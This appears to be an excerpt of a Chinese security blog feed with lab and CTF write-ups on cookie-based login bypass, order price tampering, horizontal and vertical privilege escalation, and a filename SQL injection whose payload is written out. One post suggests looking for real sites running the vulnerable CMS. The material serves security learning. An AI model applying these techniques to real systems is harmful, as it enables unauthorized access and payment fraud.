src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601100646865.png" alt="image-20220601100646865"></p><p>使用正确密码成功登录后台：</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601100314345.png" alt="image-20220601100314345"></p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>这里需要注意的主要是爆破密码时是否经过加密，有些网站后台密码是不经过加密，因此需要认真观察数据包的每个字段。</p><h2 id="0x01-Cookie脆弱点验证修改测试"><a href="#0x01-Cookie脆弱点验证修改测试" class="headerlink" title="0x01 Cookie脆弱点验证修改测试"></a>0x01 Cookie脆弱点验证修改测试</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>靶场：熊海cms内容管理系统</p><p>攻击机：windows10</p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>观察一下首页只有几个功能项，随便点击几个观察一下：</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601102058038.png" alt="image-20220601102058038"></p><p>###0x02</p><p>通过点击列表，下载，联系这几个功能项，观察url可以发现它是通过<code>r</code>进行传参跳转页面面：</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601102229259.png" alt="image-20220601102229259"></p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601102240865.png" alt="image-20220601102240865"></p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601102251015.png" alt="image-20220601102251015"></p><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>查看一下源代码进行一下代码审计：</p><p>网站目录如下：</p><p>这里index传参r,判断传递的参数file是为空还是为index，如果是index，就执行file文件下的传递参数的文件。这里只有等于index路径才能跳转。<img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601105349438.png" alt="image-20220601105349438"></p><p>如果r&#x3D;index,在跳转管理员执行&#x2F;files&#x2F;index.php文件，文件开头包含了验证，防止用户直接登录URL路径进入管理员后台</p><p>因为访问的index.php，在审计file文件夹中index.php文件,看到的是执行了以下两个文件，对这两文件进行查看。</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601102603701.png" alt="image-20220601102603701"></p><p><code>file</code>文件夹下的<code>index</code>文件中又请求了<code>checklogin.php</code>文件，用来检查登录情况，防止用户直接通过<code>url</code>进去网站后台。</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601104314229.png" alt="image-20220601104314229"></p><p>当登录时候后台会检测<code>uesr</code>字段，如果<code>useer</code>字段为空，直接跳转到<code>login.php</code>，若<code>user</code>字段不为空，直接无需账号密码通过后台地址登录后台。</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601104424220.png" alt="image-20220601104424220"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>这里第一次查看登录信息请求包是没有cookie信息的：</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601115506348.png" alt="image-20220601115506348"></p><p>当正常登录之后会有cookie信息：<br><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601115702141.png" alt="image-20220601115702141"></p><p>而网站后台主页地址是：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.216.128:8065&#x2F;admin&#x2F;?r&#x3D;index<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回登录界面直接访问后台地址抓包：<br><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601115823388.png" alt="image-20220601115823388"></p><p>此时有cookie数据（users&#x3D;admin是正常登录之后遗留下来的）。</p><p>根据代码审计<code>user</code>值只要不为空即可直接登录后台，表明<code>user</code>值随便填，将<code>user</code>值修改为1进行放包：<br><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601120032796.png" alt="image-20220601120032796"></p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601120112426.png" alt="image-20220601120112426"></p><p>成功登录后台。</p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>因为这个网站后台的首页的是index通过传参的方式验证登录。登录之前会对cookie进行验证验证由于方式很过于简单只是对cookie是否为空进行判断，也就是说传递的值不是为空程序就认为你是登录了，因此这就形成了弱cookie登录的漏洞。</p><p> 实战条件下，如何去分析漏洞：</p><p>—没有源码，去找cookie脆弱点十分困难的</p><p>—如果有特殊值，如user&#x3D;admin，可以尝试修改，看是不是可以登录到其它用户，如user&#x3D;text</p><p>—可以根据这个漏洞，去搜索采用熊海CMS的网站是否存在cookie脆弱的漏洞</p><h2 id="0x02-某建站西永商品支付逻辑测试-价格，商品"><a href="#0x02-某建站西永商品支付逻辑测试-价格，商品" class="headerlink" title="0x02 某建站西永商品支付逻辑测试-价格，商品"></a>0x02 某建站西永商品支付逻辑测试-价格，商品</h2><h3 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h3><p>靶场：大米cms</p><p>攻击机：windows10</p><h3 id="0x01-修改产品"><a href="#0x01-修改产品" class="headerlink" title="0x01 修改产品"></a>0x01 修改产品</h3><p>打开主页购买大米测试产品，直接购买10个，抓取数据包：</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601145205840.png" alt="image-20220601145205840"></p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601145124895.png" alt="image-20220601145124895"></p><p>再购买大米手机cms，抓取数据包：</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601145326843.png" alt="image-20220601145326843"></p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601145436920.png" alt="image-20220601145436920"></p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>分析数据包可知，只有id和name字段值不同，那这里可以使用低价的id和name去替换高价的id和name达到以低价购买高价的目的：</p><p>先购买10个大米cms</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601151357441.png" alt="image-20220601151357441"></p><p>替换字段</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601151445898.png" alt="image-20220601151445898"></p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601151513159.png" alt="image-20220601151513159"></p><p>可以看到开始时候购买的是大米cms总计54000，修改数据包之后变为大米测试产品，实现以低价购买高价的目的。</p><h3 id="0x03-修改价格"><a href="#0x03-修改价格" class="headerlink" title="0x03 修改价格"></a>0x03 修改价格</h3><p>观察数据包发现price字段就是产品的价格，修改价格为1：<br><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601150542871.png" alt="image-20220601150542871"></p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601150619221.png" alt="image-20220601150619221"></p><p>这里可以看到价格更改成功，订单总价变化。</p><h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
      
      
      <categories>
          
          <category> 逻辑越权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逻辑越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑越权--登录脆弱及支付篡改</title>
      <link href="/2022/05/31/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E5%8F%8A%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/"/>
      <url>/2022/05/31/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E5%8F%8A%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00-登录应用功能点安全问题"><a href="#0x00-登录应用功能点安全问题" class="headerlink" title="0x00 登录应用功能点安全问题"></a>0x00 登录应用功能点安全问题</h2><p>检测功能点，检测，危害，修复方案等</p><p>检测：存在登录功能点的地方</p><p>危害：不用账号密码直接登录</p><p>登陆点越权方法：</p><p>1.登录点暴力破解：如果数据包传输的账号密码没有加密或加密方式已知，可以尝试暴力破解<br>2.HTTP&#x2F;HTTPS 传输：https会采用加密传输，http不一定<br>3.Cookie 脆弱点验证：代码审计，看看cookie有无可操作的值，调整那些跟你登陆页面有关的项，看是否会影响功能。如修改“user”的值。<br>4.Session 固定点测试<br>5.验证密文比对安全测试</p><h2 id="0x01-数据篡改安全问题"><a href="#0x01-数据篡改安全问题" class="headerlink" title="0x01 数据篡改安全问题"></a>0x01 数据篡改安全问题</h2><p><strong>商品购买流程：</strong><br>选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付</p><p><strong>常见篡改参数：</strong><br>商品编号 ID，购买价格，购买数量，支付方式，订单号，支付状态等</p><p><strong>常见修改方法</strong>：<br>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等</p><p>参考文章：<a href="https://www.secpulse.com/archives/67080.html">https://www.secpulse.com/archives/67080.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 逻辑越权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逻辑越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑越权靶场</title>
      <link href="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/"/>
      <url>/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>靶机：pikachu逻辑越权，墨者靶场-身份认证失效漏洞实战</p><p>攻击机：windows10</p><h2 id="0x01-水平越权"><a href="#0x01-水平越权" class="headerlink" title="0x01 水平越权"></a>0x01 水平越权</h2><p>###0x00</p><p>首先以普通用户登录：</p><p><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530225044980.png" alt="image-20220530225044980"></p><p><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530225055831.png" alt="image-20220530225055831"></p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>抓包查看数据包信息：<br><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530225258398.png" alt="image-20220530225258398"></p><p>将<code>username</code>字段中的kobe修改为lucy：</p><p><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530225549405.png" alt="image-20220530225549405"></p><p>可以看到用户切换成功，实现了水平越权。</p><h2 id="0x02-垂直越权"><a href="#0x02-垂直越权" class="headerlink" title="0x02 垂直越权"></a>0x02 垂直越权</h2><p>所谓垂直越权就是低权限访问高权限进行一系列操作。</p><p>###0x00</p><p>同样，先登录，但这里首先需要以管理员身份登录，之后再使用普通用户登录：<br><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530230156393.png" alt="image-20220530230156393"></p><p>###0x01</p><p>这里admin用户可以进行增加修改删除用户的操作，这里随便创建一个用户并抓取数据包：<br><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530230546904.png" alt="image-20220530230546904"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>切换pikachu用户，只有读权限，没有其他权限：<br><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530230803662.png" alt="image-20220530230803662"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>将抓到的管理员创建用户的数据包修改为用户名为asdf，密码7989之后，将浏览器中的cookie替换repeater中的cookie（图中为替换之后的cookie），再将数据包发送出去。</p><p><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530231639181.png" alt="image-20220530231639181"></p><p><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530231651693.png" alt="image-20220530231651693"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>刷新页面可以看到多了一个用户asdf，以低权限进行了高权限操作，实现了垂直越权。</p><p><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530232026563.png" alt="image-20220530232026563"></p><p><strong>这个操作的条件必须要获取管理员创建用户的数据包。</strong></p><p>pikachu的垂直越权漏洞通过游客的cookie进行创建了新用户，这是由于源文件中的adminedit.php文件（用于管理员添加用户的文件）只验证了是否登录，没有验证级别，导致存在了越权问题，最终普通用户也可以进行创建用户。</p><h2 id="墨者靶场—身份认证失效漏洞实战"><a href="#墨者靶场—身份认证失效漏洞实战" class="headerlink" title="墨者靶场—身份认证失效漏洞实战"></a>墨者靶场—身份认证失效漏洞实战</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>打开靶场，看到有个测试账户，而且题目也说了下级代理想要查看上级代理，必定要进行越权访问的。</p><p><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530233940567.png" alt="image-20220530233940567"></p><p><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530234141567.png" alt="image-20220530234141567"></p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>抓包分析：</p><p><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530234550028.png" alt="image-20220530234550028"></p><p><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530234559923.png" alt="image-20220530234559923"></p><p>这里存在两个数据包，需要把第一个登录之后抓到的包放出去得到第二个<code>card_id</code>字段的包，这里<code>card_id</code>字段其实就是每个人的编号，那找到相应的编号即可，使用爆破模块进行爆破。</p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>爆破模块爆破：<br><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530235504224.png" alt="image-20220530235504224"></p><p>长度不一样的表示由用户，但需要找到对应的用户，而登录页面看到有马春生图片，打开查看器查找相关信息，可以找到其编号：<br><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530235817580.png" alt="image-20220530235817580"></p><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>将登录的数据包<code>card_id</code>值修改为<code>20128880316</code>进行登录：<br><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220530235944269.png" alt="image-20220530235944269"></p><p>得到用户名和密码，密码值加密，看其特征应该是md5，直接解密：</p><p><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220531000104555.png" alt="image-20220531000104555"></p><h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>输入账号密码进行登录：<br><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA/image-20220531000203716.png" alt="image-20220531000203716"></p><p>得到key值。</p>]]></content>
      
      
      <categories>
          
          <category> 逻辑越权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逻辑越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑越权--水平垂直越权</title>
      <link href="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/"/>
      <url>/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：</p><p><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/image-20220530170653644.png" alt="image-20220530170653644"></p><h2 id="0x01-漏洞产生原因"><a href="#0x01-漏洞产生原因" class="headerlink" title="0x01 漏洞产生原因"></a>0x01 漏洞产生原因</h2><p>通常情况下，一个 Web 程序功能流程是登录 - 提交请求 - 验证权限 - 数据库查询 - 返回结果。如果验证权限不足，便会导致越权。常见的程序都会认为通过登录后即可验证用户的身份，从而不会做下一步验证，最后导致越权。</p><ul><li><p>隐藏URL</p></li><li><p>直接对象引用</p></li><li><p>多阶段功能</p></li><li><p>静态文件</p></li><li><p>平台配置错误</p></li></ul><h2 id="0x02-分类"><a href="#0x02-分类" class="headerlink" title="0x02 分类"></a>0x02 分类</h2><p>1、<strong>水平越权</strong></p><p><strong>水平越权是指攻击者尝试访问与他具有相同权限的用户资源。</strong><br>比如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的行为就叫做水平越权访问。<br>以下是常出现的水平越权的几种场景：</p><p>基于用户身份ID<br>在使用某个功能时，通过用户提交的身份ID（用户ID、账号、手机号、证件号等用户唯一标识）来访问或操作对应的数据。<br>基于对象ID<br>在使用某个功能时，通过用户提交的对象ID（如订单号、记录号）来访问或操作对应的数据。<br>基于文件名<br>在使用某个功能时，通过文件名直接访问文件，最常见于用户上传文件的场景。</p><p>2、<strong>垂直越权</strong></p><p><strong>垂直越权是指低权限用户尝试访问高权限用户的资源。</strong><br>由于后台应用没有做权限控制，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。<br>主要有以下两种场景：</p><p>未认证账号，访问无需认证后能访问该功能<br>不具备某个功能权限的账户，认证后能成功访问该功能</p><p><strong>垂直越权条件：</strong></p><p>需要获取管理员的数据包：</p><p>例：添加用户</p><p>需要管理员添加用户的数据包</p><p>如何获取数据包：</p><p>a.普通用户前端有操作界面可以抓取数据包</p><p>b.通过网站源码本地搭建自己去模拟抓取数据包</p><p>c.盲猜</p><p>3、<strong>未授权访问</strong></p><p>通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作。(有些操作要管理员才行) </p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>图解：</p><p><img src="/2022/05/30/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/image-20220530172600077.png" alt="image-20220530172600077"></p>]]></content>
      
      
      <categories>
          
          <category> 逻辑越权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逻辑越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界：upload</title>
      <link href="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/"/>
      <url>/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>攻防世界一道Web进阶题，题目是upload，最后做了半天使用upload的方式一点用没有，看了几篇博主的帖子，发现是SQL注入，文件名的SQL注入。</p><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511164730539.png" alt="image-20220511164730539"></p><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511164739748.png" alt="image-20220511164739748"></p><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511164837732.png" alt="image-20220511164837732"></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>上传2.jpg文件会返回文件名，上传php文件返回：不正确的拓展名；开始以为有检测，尝试了各种upload的绕过方式，都不行，都会返回不正确的拓展名。</p><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511165213924.png" alt="image-20220511165213924"></p><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511165320646.png" alt="image-20220511165320646"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>看了几篇帖子才知道是基于文件名的SQL注入：</p><p>因为回显的只是文件名，然后它存入数据库的也可能是文件名，既然连接了数据库就可能存在注入漏洞。然后就能想到可能是文件名sql注入。</p><p><strong>任何与数据库发生连接交互的地方都可能存在SQL注入！</strong></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>涉及几个函数：</p><p><code>conv(N,from_base,to_base)</code> ：conv函数接收一个数字，进行进制转换<br>N是指函数接受的数值，from_base是指这个数值原来的进制，to_base是指需要转化的进制。</p><p><code>Substr()</code><br>第一种：<br><code>SBUSTR(str,pos);</code><br>就是从pos开始的位置，一直截取到最后。<br>第二种：<br><code>SUBSTR(str,pos,len);</code><br>len指截取长度<br>这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。<br>需要注意的是：如果pos为1(而不是0)，表示从第一个位置开始</p><p><code>Hex()</code>：<br>这个函数就是把里面的参数转化成16进制。</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>插入SQl语句：</p><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511170451146.png" alt="image-20220511170451146"></p><p>可以看到<code>select</code>被过滤了，尝试绕过：</p><p>这里使用双写绕过成功</p><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511170657950.png" alt="image-20220511170657950"></p><p>在后续测试过程中from也被过滤，最后也是用双写绕过。</p><p>在这里其实就可以知道存在sql注入了；</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>尝试去验证sql注入：</p><pre class="line-numbers language-none"><code class="language-none">1&#39;+(selselectect database())+&#39;.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到sql语句被执行了，但是只输出一个1，后续查询的结果没有被输出。(可能数据被过滤掉了)</p><p><img src="/2022/05/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%9Aupload/image-20220511171849122.png" alt="image-20220511171849122"></p><p><img 